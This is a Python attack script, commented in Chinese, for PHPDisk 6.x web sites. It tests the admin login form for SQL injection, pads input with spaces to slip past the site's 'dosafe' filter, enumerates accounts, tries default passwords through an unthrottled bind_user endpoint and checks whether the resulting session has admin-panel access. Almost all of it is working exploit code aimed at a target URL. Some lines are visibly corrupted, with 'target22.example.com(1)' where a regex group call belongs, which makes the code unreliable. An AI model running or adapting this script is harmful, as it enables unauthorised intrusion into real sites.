#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""PHPDisk 6.x adminlogin 注入面快速判定 + 后台 gid=1 校验

用途：判断某 PHPDisk 站点是否真的存在 adminlogin SQLi，以及拿到的账号能否进后台。
三个判定一次跑完，避免在 addslashes 封死的点位上白耗时间。

用法：python3 phpdisk_sqli_triage.py https://TARGET
"""
import sys, re, ssl, urllib.request, urllib.parse, random, string

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "https://TARGET"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36"
CTX = ssl.create_default_context(); CTX.check_hostname = False; CTX.verify_mode = ssl.CERT_NONE
OP = urllib.request.build_opener(urllib.request.HTTPSHandler(context=CTX))
OP.addheaders = [("User-Agent", UA)]


def req(path, data=None, cookie=None, raw=False):
    url = BASE + path
    body = urllib.parse.urlencode(data, doseq=True).encode() if isinstance(data, (dict, list)) else (
        data.encode() if isinstance(data, str) else data)
    h = {"Cookie": cookie} if cookie else {}
    r = urllib.request.Request(url, data=body, headers=h)
    try:
        with OP.open(r, timeout=30) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except Exception as e:
        return 0, {}, str(e).encode()


def cookie_of(headers):
    m = re.search(r"PHPSESSID=([a-z0-9]+)", headers.get("Set-Cookie", ""))
    return "PHPSESSID=" + target22.example.com(1) if m else None


def formhash(ck):
    st, hd, b = req("/account.php?action=adminlogin", cookie=ck)
    m = re.search(rb'name="formhash" value="([0-9a-f]+)"', b)
    return target22.example.com(1).decode() if m else ""


def txt(b):
    x = b.decode("utf-8", "ignore")
    x = re.sub(r"<script.*?</script>", " ", x, flags=re.S)
    x = re.sub(r"<[^>]+>", " ", x)
    return re.sub(r"\s+", " ", x).strip()


# ---------- 1) adminlogin 注入面判定 ----------
ck = cookie_of(req("/")[1])
fh = formhash(ck)


def try_user(u):
    st, hd, b = req("/account.php", {"action": "adminlogin", "task": "adminlogin", "ref": "",
                                     "formhash": fh, "username": u, "password": "zzz",
                                     "verycode": "0000"}, cookie=ck)
    t = txt(b)
    if len(b) == 0:
        return "ZEROBODY(dosafe kill)"
    if "未注册" in t or "user_not_exists" in t:
        return "FALSE"
    if "不是合法的后台管理员" in t or "not_admin" in t:
        return "TRUE"
    return "OTHER len=%d" % len(b)


print("=== [1] adminlogin 注入面判定 ===")
print("  username=admin              ->", try_user("admin"))
print("  username=admin'             ->", try_user("admin'"))
print("  username=admin\\             ->", try_user("admin\\"))
print("  username=admin and 1=1      ->", try_user("admin and 1=1"), "  (0字节=被dosafe杀)")
print("  username=admin{8空格}1=1     ->", try_user("admin" + " " * 8 + "1=1"), "  (>6字符填充绕过dosafe)")
print("  判定：admin=TRUE 而 admin'=FALSE 说明注入在 SQL 层存在；")
print("        但 addslashes 使引号无法闭合 -> 只能做账号存在性枚举，不能取数据。")
print("        若 admin and 1=1 为 0 字节而 8 空格版正常 -> dosafe 窗口为 .{1,6}?，填充即可绕。")

# ---------- 2) bind_user 口令校验（无频控） ----------
print()
print("=== [2] bind_user 口令校验 ===")


def bind(u, p):
    ck2 = cookie_of(req("/")[1])
    flid = "zz" + "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))
    st, hd, b = req("/example.com?action=bind_user", {"flid": flid, "username": u, "password": p}, cookie=ck2)
    t = b.decode("utf-8", "ignore").strip()
    ok = t.startswith("true") and "phpdisk_zcore_v2_info" in hd.get("Set-Cookie", "")
    return ok, (ck2 + "; " + re.search(r"(phpdisk_zcore_v2_info=[^;]+)", hd.get("Set-Cookie", "")).group(1)
                if ok else None)


# ---------- 3) 后台 gid=1 校验 ----------
def is_admin(ticket):
    if not ticket:
        return False
    st, hd, b = req("/example.com", cookie=ticket)
    t = b.decode("utf-8", "ignore")
    return ("admincp_left_frame" in t) or ("admincp_fast" in t) or ("系统设置" in t)


for u, p in [("administrator", "12345678"), ("admin", "12345678")]:
    ok, ticket = bind(u, p)
    print("  %-14s / %-12s -> login=%s  admincp=%s" % (u, p, ok, is_admin(ticket)))

print()
print("关键结论：bind_user 命中的账号若是 gid!=1，/example.com 仍返回登录页；")
print("后台管理员口令存于 {tpf}admins 表，与 {tpf}users 表口令分离，不能靠前台口令复用。")
